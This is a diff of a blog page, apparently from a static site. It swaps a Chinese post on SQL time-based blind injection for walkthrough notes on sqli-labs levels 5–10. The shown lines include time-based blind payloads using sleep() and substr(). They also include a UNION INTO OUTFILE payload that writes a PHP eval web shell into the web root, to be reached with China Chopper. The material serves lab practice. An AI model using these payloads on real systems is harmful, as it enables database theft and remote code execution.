@@ -8,7 +8,7 @@
   
   
   <title>
-    sql时间盲注 |
+    “sqlilab5-10” |
     
     Bai
   </title>
@@ -32,7 +32,7 @@
 <body>
   <main class="content">
     <section class="outer">
-  <article id="post-sql时间盲注" class="article article-type-post" itemscope
+  <article id="post-“sqlilab5-10”" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -41,7 +41,7 @@
       
 
 <h1 class="article-title" itemprop="name">
-  sql时间盲注
+  “sqlilab5-10”
 </h1>
 
 
@@ -51,8 +51,8 @@
 
     
     <div class="article-meta">
-      <a href="/2021/10/20/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="article-date">
-  <time datetime="2021-10-20T13:59:54.000Z" itemprop="datePublished">2021-10-20</time>
+      <a href="/2021/10/23/%E2%80%9Csqlilab5-10%E2%80%9D/" class="article-date">
+  <time datetime="2021-10-23T12:53:51.000Z" itemprop="datePublished">2021-10-23</time>
 </a>
       
     </div>
@@ -68,28 +68,33 @@
       
       
       
-      <h2 id="sql时间盲注"><a href="#sql时间盲注" class="headerlink" title="sql时间盲注"></a>sql时间盲注</h2><h4 id="SQL注入-时间注入"><a href="#SQL注入-时间注入" class="headerlink" title="SQL注入-时间注入"></a>SQL注入-时间注入</h4><p>​            时间注入攻击</p>
-<h4 id="时间注入攻击"><a href="#时间注入攻击" class="headerlink" title="时间注入攻击"></a>时间注入攻击</h4><p>利用sleep()或者benchmark()等函数让MySQL的执行时间变长。与IF(expr1,expr2,expr3)结合使用。当满足条件expr1时执行expr2，不满足时执行expr3。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.17.137/sql/Less-1/?id=1&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+      <h2 id="sqlilab5-10"><a href="#sqlilab5-10" class="headerlink" title="sqlilab5-10"></a>sqlilab5-10</h2><h3 id="sqlilab5"><a href="#sqlilab5" class="headerlink" title="sqlilab5"></a>sqlilab5</h3><p>通过尝试可以得出存在注入点，而且为单引号注入</p>
+<p>由于没有回显</p>
+<p>可以通过报错注入、时间盲注、布尔盲注</p>
+<h3 id="sqlilab6"><a href="#sqlilab6" class="headerlink" title="sqlilab6"></a>sqlilab6</h3><p>通过尝试可以得出为双引号注入</p>
+<p>其他与第五题一样</p>
+<h3 id="sqlilab7"><a href="#sqlilab7" class="headerlink" title="sqlilab7"></a>sqlilab7</h3><p>通过尝试得出为((‘id’))的形式，同时通过尝试无法使用报错注入，但是可以使用时间盲注和布尔盲注</p>
+<p>可是通过提示发现要求我们使用<code>outfile</code></p>
+<p>同时可以使用一句话木马，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; into outfile &quot;F:\\WhiteFlie\\PhpStudy20180211\\PHPTutorial\\WWW\\sqli-labs\\ttt.php&quot;--+</span><br></pre></td></tr></table></figure>
 
-
-<p>执行时间为5s以上<br><img src="https://img-blog.csdnimg.cn/2021041613503592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeGluXzEwMTA=,size_16,color_FFFFFF,t_70"></p>
-<p>执行很短时间返回结果(正确会延迟5秒返回，错误直接返回)</p>
-<p><img src="https://img-blog.csdnimg.cn/20210416135113591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeGluXzEwMTA=,size_16,color_FFFFFF,t_70"></p>
-<p>多次使用length()可以判断数据库库名长度<br>知晓库名长度后使用substr函数逐位查询数据库库名字母</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.17.137/sql/Less-1/?id=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210416135535820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeGluXzEwMTA=,size_16,color_FFFFFF,t_70"></p>
-<p>程序超过5s返回，证明数据库名第一位为’s’</p>
+<p>用中国菜刀连接</p>
+<h3 id="sqlilab8"><a href="#sqlilab8" class="headerlink" title="sqlilab8"></a>sqlilab8</h3><p>通过尝试得出为单引号注入，没有报错回显，所以无法使用报错注入，但是可以用时间盲注和布尔盲注，以及outfile</p>
+<h3 id="sqlilab9"><a href="#sqlilab9" class="headerlink" title="sqlilab9"></a>sqlilab9</h3><p>这一题比较恶心，不管是正确与错误，它的返回值都是一样的</p>
+<p>所以无法用直接看出注入点，</p>
+<p>但是可以用sleep来测试</p>
+<p>?id=1‘ and sleep(5) –+</p>
+<p>如果and前面正常就会延迟5秒显示，反之不会，其他与第八题一样</p>
+<h3 id="sqlilab10"><a href="#sqlilab10" class="headerlink" title="sqlilab10"></a>sqlilab10</h3><p>与第9题基本相同，只有一点不同，就是为双引号注入，其他一样</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/20/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="ckv629esl0008q4tc6baohyvx" class="article-share-link">
+      <a data-url="http://example.com/2021/10/23/%E2%80%9Csqlilab5-10%E2%80%9D/" data-id="ckv629eso000dq4tch7xd746u" class="article-share-link">
         Share
       </a>
       
-<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" rel="tag">sql时间盲注</a></li></ul>
+<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilab/" rel="tag">sqlilab</a></li></ul>
 
     </footer>
 
@@ -99,19 +104,19 @@
   
 <nav class="article-nav">
   
-  <a href="/2021/10/20/sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="article-nav-link">
+  <a href="/2021/10/24/%E2%80%9Cmysql%E7%9A%84%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E2%80%9D/" class="article-nav-link">
     <strong class="article-nav-caption">Newer</strong>
     <div class="article-nav-title">
       
-      sql布尔盲注
+      “mysql的文件导出”
       
     </div>
   </a>
   
   
-  <a href="/2021/10/16/sql-labs%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-nav-link">
+  <a href="/2021/10/20/sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="article-nav-link">
     <strong class="article-nav-caption">Older</strong>
-    <div class="article-nav-title">sql-labs报错注入</div>
+    <div class="article-nav-title">sql布尔盲注</div>
   </a>
   
 </nav>
